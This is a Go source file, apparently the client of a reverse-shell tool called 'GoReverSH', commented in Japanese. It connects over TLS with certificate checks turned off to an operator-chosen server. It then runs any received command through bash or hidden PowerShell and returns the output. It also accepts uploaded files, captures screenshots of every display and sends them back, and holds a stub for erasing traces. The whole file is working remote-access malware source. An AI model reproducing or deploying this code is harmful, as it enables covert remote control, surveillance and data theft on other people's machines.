package main

import (
	"GoReverSH/utils"
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"image/png"
	"io"
	"log"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/kbinani/screenshot"
)

type Option struct {
	LHOST string
	RHOST string
}

//4桁のIDを作成
func genNumStr(len int) string {
	var container string
	var str = "1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

func padString(source string, toLength int) string {
	currLength := len(source)
	remLength := toLength - currLength

	for i := 0; i < remLength; i++ {
		source += ":"
	}
	return source
}

//TODO outputDirを指定
//スクリーンショットを撮影
//conn net.Conn
func getscreenshot() ([]string, error) {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return nil, err
		}
		/*
			if runtime.GOOS == "windows" {
				fpth = `C:\Windows\Temp\`
			} else {
				fpth = `/tmp/`
			}
		*/
		fpth = "./screenshot/"
		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, err := os.Create(fullpath)
		if err != nil {
			return nil, err
		}

		defer file.Close()
		png.Encode(file, img)
		//png.Encode(conn, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames, nil
}

func runShell(conn net.Conn) {
	defer conn.Close()
	for {
		cmdBuff := make([]byte, 1024)
		n, err := conn.Read(cmdBuff)
		if err != nil {
			if errors.Is(err, io.EOF) {
				log.Println("disconnect")
				return
			}
			log.Println(err)
			return
		}

		commands := strings.Split(string(cmdBuff[:n]), " ")

		//コマンドの引数の数もチェックすること
		switch commands[0] {
		case "cd":
			dir := commands[len(commands)-1]
			os.Chdir(string(dir))

		case "upload":
			dir := "upload"
			if _, err := os.Stat(dir); os.IsNotExist(err) {
				if err2 := os.MkdirAll(dir, 0755); err2 != nil {
					log.Fatalf("Could not create the path %s", dir)
				}
			}
			fileName := commands[len(commands)-1]
			fmt.Println(fileName)
			//read
			//最終的な入れ物
			var content []byte
			//読み込むもの
			buf := make([]byte, 1024)
			//読み込む位置
			size := 0
			//fmt.Printf("%p\n", content)

			for {
				//ファイルを読み込む
				n, err := conn.Read(buf)
				if err != nil {
					if n == 0 || err == io.EOF {
						break
					}
					log.Println(err)
					break
				}
				//content + bufの中身を一時的に保存。
				tmp := make([]byte, 0, size+n)
				tmp = append(content[:size], buf[:n]...)
				content = tmp
				size += n
				if n < 1024 {
					break
				}
			}

			//fmt.Println(string(content))
			//save
			file, err := os.Create(dir + "/" + fileName)
			if err != nil {
				conn.Write([]byte(err.Error()))
				break
			}
			_, err = file.Write(content)
			if err != nil {
				file.Close()
				log.Println(err)
				break
			}
			err = file.Close()
			if err != nil {
				log.Println(err)
				break
			}
			fmt.Println("content save")
			conn.Write([]byte("Upload Success"))

		case "screenshot": //ex: screenshot
			//TODO io.Writerに直接書けない？
			//スクリーンショットを撮影し送信
			filenames, err := getscreenshot()
			fmt.Println(filenames)
			if err != nil {
				//エラーを返す
				continue
			}

			//終了通知
			//空の名前、中身で終了
			//screenshot fin
			fin := utils.Output{Type: utils.FIN}
			j, err := json.Marshal(fin)
			if err != nil {
				continue
			}
			fmt.Println(string(j))
			conn.Write(j)

			for _, fname := range filenames {
				//sendFile
				f, err := os.Open(fname)
				if err != nil {
					log.Fatalln(err)
					break
				}

				//書き込み
				//構造体にして送る？
				fstats, err := f.Stat()
				if err != nil {
					log.Fatalln(err)
					break
				}
				name := strings.Split(fname, "/")[2]
				fileinfo := utils.FileInfo{Name: name, Size: fstats.Size()}
				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
				j, err := json.Marshal(output)
				if err != nil {
					log.Fatalln(err)
					break
				}
				//serverでは、Unmarshalできなくなったら終了
				fmt.Println(string(j))
				_, err = conn.Write([]byte(padString(string(j), 1024)))
				if err != nil {
					log.Fatalln(err)
					break
				}

				//time.Sleep(1 * time.Second)

				/*
					body, err := io.ReadAll(f)
					if err != nil {
						log.Fatalln(err)
						break
					}
					fmt.Println(string(body))
				*/
				//conn.Write(body)

				/*
					sendBuff := make([]byte, 1024)
					for {
						n, err := f.Read(sendBuff)
						if err != nil {
							break
						}
						conn.Write(sendBuff[:n])
					}
				*/

				//fileInfoのWriteが消されてしまう

				_, err = io.Copy(conn, f)
				if err != nil {
					break
				}

				f.Close()
			}

			fmt.Println("screenshot finished")

		case "download": //ex: download [path]
		//ファイルシステム構築

		//ディレクトリトラバーサルで再起的にアクセスし、書き込む
		//構造体に入れる　ファイル名、ボディ
		//json.Marshalでバイトに変換

		//write

		//download success

		case "clean": //痕跡消去 ex: clean_go_reversh
		//tips/main11.goを参考

		default:
			var cmd *exec.Cmd
			//mac linux or windows
			if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
				cmd = exec.Command("/bin/bash", "-c", string(cmdBuff[:n]))
			} else if runtime.GOOS == "windows" {
				cmd = exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", string(cmdBuff[:n]))
			}
			out, err := cmd.Output()
			if err != nil {
				log.Println(err)
				return
			}
			//後で消す
			fmt.Println(string(out))
			_, err = conn.Write(out)
			if err != nil {
				log.Println(err)
				return
			}
		}
	}

}

func main() {
	certFile, keyFile, err := utils.GenClientCerts()
	if err != nil {
		log.Fatalln(err)
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("Loadkeys : %s", err)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	//config := &tls.Config{InsecureSkipVerify: true}

	server := flag.String("server", "", "ipaddr")
	port := flag.String("port", "8000", "port")
	flag.Parse()

	//fmt.Println(*server, *port)
	conn, err := tls.Dial("tcp", net.JoinHostPort(*server, *port), config)
	if err != nil {
		log.Fatalf("Client dial error: %s", err)
	}
	defer fmt.Println("Cleanup")
	defer conn.Close()

	//クライアント名を作成
	//hostName, _ := os.Hostname() //develop
	hostName := "" //debug
	id := genNumStr(4)
	clientName := hostName + id
	//送信
	conn.Write([]byte(clientName))

	//shell
	runShell(conn)
}
